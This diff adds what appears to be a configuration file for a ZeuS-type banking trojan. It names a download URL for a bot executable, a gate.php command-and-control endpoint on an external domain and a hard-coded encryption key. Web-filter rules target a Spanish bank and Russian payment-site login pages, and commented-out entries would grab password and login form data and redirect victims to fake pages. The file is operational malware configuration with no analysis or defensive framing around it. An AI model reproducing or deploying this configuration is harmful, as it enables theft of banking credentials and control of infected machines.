@@ -1,0 +1,37 @@
+;Build time:   14:19:16 16.07.2017 GMT
+;Version:      5.0.0.1[2017]
+
+entry "StaticConfig"
+  ;botnet "btn1"
+  timer_config 60 1
+  timer_logs 1 1
+  timer_stats 20 1
+  url_config "http://testlogin/config.bin"
+  remove_certs 1
+  disable_tcpserver 0
+  encryption_key "1234567890"
+end
+
+entry "DynamicConfig"
+  url_loader "http://micklogin123.com/feel/bot.exe"
+  url_server "http://micklogin123.com/feel/gate.php"
+  file_webinjects "webinjects.txt"
+  entry "AdvancedConfigs"
+    ;"http://micklogin123.com/feel/cfg1.bin"
+  end
+  entry "WebFilters"
+    "!*.microsoft.com/*"
+    "!http://*myspace.com*"
+    "https://www.gruposantander.es/*"
+    "!http://*odnoklassniki.ru/*"
+    "!http://vkontakte.ru/*"
+    "@*/login.osmp.ru/*"
+    "@*/atl.osmp.ru/*"
+  end
+  entry "WebDataFilters"
+    ;"http://mail.rambler.ru/*" "passw;login"
+  end
+  entry "WebFakes"
+    ;"http://www.google.com" "http://www.yahoo.com" "GP" "" ""
+  end
+end
